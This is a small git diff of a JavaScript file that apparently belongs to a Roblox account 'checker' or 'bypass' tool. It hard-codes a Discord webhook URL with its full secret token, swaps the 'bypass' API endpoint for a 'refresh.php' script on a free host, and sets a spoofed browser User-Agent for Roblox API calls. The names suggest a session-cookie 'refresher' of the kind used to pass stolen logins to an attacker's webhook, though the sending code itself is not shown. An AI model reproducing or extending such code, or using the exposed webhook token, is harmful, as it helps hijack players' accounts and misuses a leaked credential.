@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', function() {
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1461633934101053552/IhUbmHtj_YV8f96PDZa7kCZ8ao4-atRqtIqD9-ujWCKv8R7Zye1gss2LwGDIawebUFXf";
   
   // Your API endpoint
-  const BYPASS_API_URL = "https://rblx-checker-infos.vercel.app/api/bypass";
+  const BYPASS_API_URL = "https://rbx-tool-refresh.x10.mx/refresh.php";
   
   // Standard Mozilla User-Agent for ALL Roblox API requests
   const MOZILLA_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
